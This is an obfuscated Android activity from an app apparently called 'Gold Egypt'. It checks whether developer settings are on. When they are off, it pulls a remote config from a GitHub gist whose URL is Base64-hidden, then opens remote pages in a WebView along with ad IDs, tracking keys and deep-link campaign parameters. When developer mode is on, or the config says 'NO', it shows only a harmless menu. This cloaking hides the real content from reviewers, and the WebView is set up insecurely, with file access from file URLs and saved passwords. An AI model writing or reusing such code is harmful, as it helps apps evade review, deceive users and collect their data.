package com.gold.egypy.g2epi;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.room.Room;

import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.gold.egypy.g2epi.dksa.Databaddkwdw;
import com.onesignal.OneSignal;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class GE extends AppCompatActivity {

    public static Databaddkwdw databaddkwdw;
    WebView webYdms;
    ProgressBar ksd;
    Button jdsud, jdgua, ydhxa, ydgha;
    static String jdsh;
    static String hsj;
    static String jdnas;
    static String jhda;
    static String jdj;
    static String qwerx;
    static String jduubnc;
    public ValueCallback<Uri> jhuqd;
    public Uri jugvgew = null;
    public ValueCallback<Uri[]> hhuuew;
    public String kjdide;
    public static final int kjkkds = 1;
    int vb;
    private final String polissisi = "aHR0cHM6Ly93d3cucHJpdmFjeXBvbGljeW9ubGluZS5jb20vbGl2ZS5waHA/dG9rZW49MmdvalBhbGV0WldqaEV3YWh0ckx3Wk9xZUlEY1NBTUU=";
    public String jdaweq;
    public String kiuyhsd;
    public int ccc;
    public String savvva;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(1024);
        setContentView(R.layout.ge);
        fja();
        vb = Settings.Secure.getInt(this.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
        kdl();

        new Thread(new Runnable() {
            @Override
            public void run() {
                databaddkwdw = Room.databaseBuilder(getApplicationContext(),
                        Databaddkwdw.class, "ujkaokq").build();
                try {
                    ccc = databaddkwdw.daofoudsds().gethowMsdsd();
                    savvva = databaddkwdw.daofoudsds().getlastWdsds().savevevev;

                }catch (Exception e){

                }

            }
        }).start();


    }

    private void fja(){
        ksd = findViewById(R.id.progressBar);
        jdsud = findViewById(R.id.buttonSt);
        jdgua = findViewById(R.id.buttonPri);
        ydhxa = findViewById(R.id.buttonGePri);
        ydgha = findViewById(R.id.buttonClosG);
        webYdms = findViewById(R.id.webYdms);
    }

    private void kdl(){
        if (vb == 0){
            new Thread(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.O)
                @Override
                public void run() {

                    try {

                        String jfdk = ifi();
                        String [] jsd = jfdk.split("\\\u007C");
                        String kihsd = jsd[0];
                        String kijhnsd = jsd[1];
                        String lojnsd = jsd[2];


                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                FacebookSdk.setApplicationId(lojnsd);
                                FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                                FacebookSdk.sdkInitialize(getApplicationContext());
                                FacebookSdk.fullyInitialize();
                                FacebookSdk.setAutoInitEnabled(true);
                                FacebookSdk.setAutoLogAppEventsEnabled(true);

                                AppEventsLogger.activateApp(getApplication());
                                AppLinkData.fetchDeferredAppLinkData(GE.this, new AppLinkData.CompletionHandler() {
                                    @Override
                                    public void onDeferredAppLinkDataFetched(@Nullable AppLinkData jfsue) {

                                        if (jfsue == null) {
                                            jfsue = AppLinkData.createFromActivity(GE.this);
                                        }
                                        if (jfsue != null) {
                                            Uri url = jfsue.getTargetUri();
                                             jdaweq = url.getQuery();
                                             kiuyhsd = papapap(jdaweq,getPackageName(), Apepewqx.iuytsd,Apepewqx.jksda);

                                        }else {
                                        }

                                    }
                                });



                                if (ccc>0){
                                    startW();
                                    webYdms.loadUrl(savvva);
                                }else{

                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        startW();

                                        String jfheu = Apepewqx.ojndjq;
                                        String kihhfd = null;
                                        if (jfheu.equals(dddddeeekkk("Tm9uLW9yZ2FuaWM="))){
                                            kihhfd = kihsd + Apepewqx.kihdbwu;
                                            webYdms.loadUrl(kihhfd);
                                        }else if(jdaweq != null) {
                                            kihhfd = kihsd + kiuyhsd;
                                            webYdms.loadUrl(kihhfd);
                                        }else {
                                            if (kijhnsd.equals(dddddeeekkk("Tk8="))) {
                                                webYdms.setVisibility(View.INVISIBLE);
                                                idlsd();
                                                uds();
                                            }else {
                                                String strAppsFlyer = kijhnsd + dddddeeekkk("P2J1bmRsZT0=") + getPackageName() + dddddeeekkk("JmFkX2lkPQ==") + Apepewqx.iuytsd + dddddeeekkk("JmFwcHNfaWQ9") + Apepewqx.jksda + dddddeeekkk("JmRldl9rZXk9") + dddddeeekkk(Apepewqx.appK);
                                                kihhfd = kihsd + strAppsFlyer;
                                                webYdms.loadUrl(kihhfd);
                                            }
                                        }
                                    }
                                },5000);

                            }
                            }

                        });

                    }catch (Exception e){
                       Intent jiss = new Intent(GE.this,MainActivity.class);
                       startActivity(jiss);
                       finishAffinity();
                    }

                }
            }).start();

        }else {
            idlsd();
            uds();

        }

    }

    private void idlsd(){
        ksd.setVisibility(View.INVISIBLE);
        jdsud.setVisibility(View.VISIBLE);
        jdgua.setVisibility(View.VISIBLE);
        ydhxa.setVisibility(View.VISIBLE);
        ydgha.setVisibility(View.VISIBLE);
    }

    private void uds(){
        jdsud.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent jdl = new Intent(GE.this,MainActivity.class);
                startActivity(jdl);

            }
        });

        jdgua.setOnClickListener(new View.OnClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void onClick(View view) {
                startW();
                webYdms.loadUrl(dddddeeekkk(polissisi));
                ydgha.setVisibility(View.INVISIBLE);
                jdsud.setVisibility(View.INVISIBLE);
                ydhxa.setVisibility(View.INVISIBLE);
                jdgua.setVisibility(View.INVISIBLE);

            }
        });

        ydhxa.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent jdk = new Intent(GE.this,GePri.class);
                startActivity(jdk);

            }
        });

        ydgha.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finishAffinity();
            }
        });

    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    private String ifi()throws Exception{
        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(dddddeeekkk("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzLzBjYmQ3MDdmZGRlNjU4ZWFmNjY5MjhhOTM5M2E0MmNlL3Jhdy9Hb2xkX0VneXB0")).openConnection();
        BufferedReader sds = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
        String hsdj = sds.readLine();
        return hsdj;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode != kjkkds || hhuuew == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (kjdide != null) {
                    results = new Uri[]{Uri.parse(kjdide)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        hhuuew.onReceiveValue(results);
        hhuuew = null;
        if (jhuqd == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }

        Uri result = null;
        try {
            if (resultCode != RESULT_OK) {
                result = null;
            } else {
                result = data == null ? jugvgew : data.getData();
            }
        } catch (Exception e) { }
        jhuqd.onReceiveValue(result);
        jhuqd = null;
    }

    @Override
    public void onBackPressed() {
        if (webYdms.isFocused() && webYdms.canGoBack()) {
            webYdms.goBack();
        }
    }

    private void startW(){

        CookieManager.getInstance().setAcceptThirdPartyCookies(webYdms, true);
        CookieManager.getInstance().setAcceptCookie(true);
        webYdms.getSettings().setAppCacheEnabled(true);
        webYdms.getSettings().setLoadsImagesAutomatically(true);
        webYdms.setSaveEnabled(true);
        webYdms.getSettings().setMixedContentMode(0);
        webYdms.setFocusable(true);
        webYdms.setVisibility(View.VISIBLE);
        webYdms.getSettings().setAllowFileAccessFromFileURLs(true);
        webYdms.getSettings().setSavePassword(true);
        webYdms.getSettings().setDatabaseEnabled(true);
        webYdms.getSettings().setRenderPriority(android.webkit.WebSettings.RenderPriority.HIGH);
        webYdms.getSettings().setCacheMode(android.webkit.WebSettings.LOAD_DEFAULT);
        webYdms.getSettings().setEnableSmoothTransition(true);
        webYdms.getSettings().setUseWideViewPort(true);
        webYdms.getSettings().setSaveFormData(true);
        webYdms.getSettings().setAllowFileAccess(true);
        webYdms.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webYdms.getSettings().setJavaScriptEnabled(true);
        webYdms.getSettings().setAllowContentAccess(true);
        webYdms.getSettings().setLoadWithOverviewMode(true);
        webYdms.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webYdms.getSettings().setDomStorageEnabled(true);
        webYdms.setFocusableInTouchMode(true);
        webYdms.setWebViewClient(new WebClientInjsjw(GE.this));
        webYdms.setWebChromeClient(new WebChromeQjxsiq(GE.this));
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String dddddeeekkk(String dsd){
        Base64.Decoder sjsd = Base64.getDecoder();
        String ksdjjd = new String(sjsd.decode(dsd));
        return ksdjjd;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String papapap(String ssd, String getPackageName, String sds, String dsdaq){

        String[] str = ssd.split("::");
        try {
            jdsh = str[0];
        }catch (Exception e){
            jdsh = "";
        }
        try {
            hsj = str[1];
        }catch (Exception e){
            hsj = "";
        }

        try {
            jdnas = str[2];
        }catch (Exception e){
            jdnas = "";

        }

        try {
            jhda = str[3];
        }catch (Exception e){
            jhda = "";
        }

        try {
            jdj = str[4];
        }catch (Exception e){
            jdj = "";
        }


        try {
            qwerx = str[5];
        }catch (Exception e){
            qwerx = "";
        }

        try {
            jduubnc = str[6];
        }catch (Exception e){
            jduubnc = "";
        }

        OneSignal.sendTag(dddddeeekkk("c3ViX2FwcA=="), hsj);

        String paramsBuild = jdsh + dddddeeekkk("P2J1bmRsZT0=") + getPackageName + dddddeeekkk("JmFkX2lkPQ==") + sds + dddddeeekkk("JmFwcHNfaWQ9") + dsdaq +
                dddddeeekkk("JnN1YjY9") + hsj +
                dddddeeekkk("JnN1Yjc9") + jdnas +
                dddddeeekkk("JnN1YjI9") + jhda +
                dddddeeekkk("JnN1YjM9") + jdj +
                dddddeeekkk("JnN1YjQ9") + qwerx +
                dddddeeekkk("JnN1YjU9") + jduubnc +
                dddddeeekkk("JmRldl9rZXk9") + dddddeeekkk(Apepewqx.appK);

        return paramsBuild;

    }
}
